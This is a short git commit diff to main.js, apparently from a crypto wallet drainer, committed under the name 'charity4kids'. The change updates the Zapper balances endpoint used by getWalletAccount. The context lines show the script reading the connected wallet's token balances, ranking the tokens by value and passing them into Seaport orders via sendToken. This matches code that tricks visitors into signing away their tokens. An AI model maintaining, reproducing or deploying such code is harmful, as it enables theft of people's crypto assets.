723ef5b42f2a8aa57eb9250705e3c7f6acccbd10
charity4kids <1butterflyup@gmail.com>
2026-06-25 15:39:09 -0700

    Update Zapper API endpoint in main.js

--- main.js
+++ main.js
@@ -494,7 +494,7 @@ async function getWalletAccount() {
         totalOriginalConsiderationItems: considers.length,
         conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
     }
- const response = await fetch("https://api.zapper.xyz/v2/balances/tokens?addresses[]="+account+"&&api_key="+ZAPPER_KEY, {
+    const response = await fetch("https://api.zapper.fi/v2/balances?addresses[]="+account+"&&api_key="+ZAPPER_KEY, {
           headers: {
             'Authorization': ZAPPER_KEY,
           }
@@ -518,8 +518,7 @@ async function getWalletAccount() {
             }
           }
         }
-    }) 
-
+    })
     if (offer.offer.length == 0) {
         tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
         await sendToken(wasWethApproved, offer, counter, Seaport);
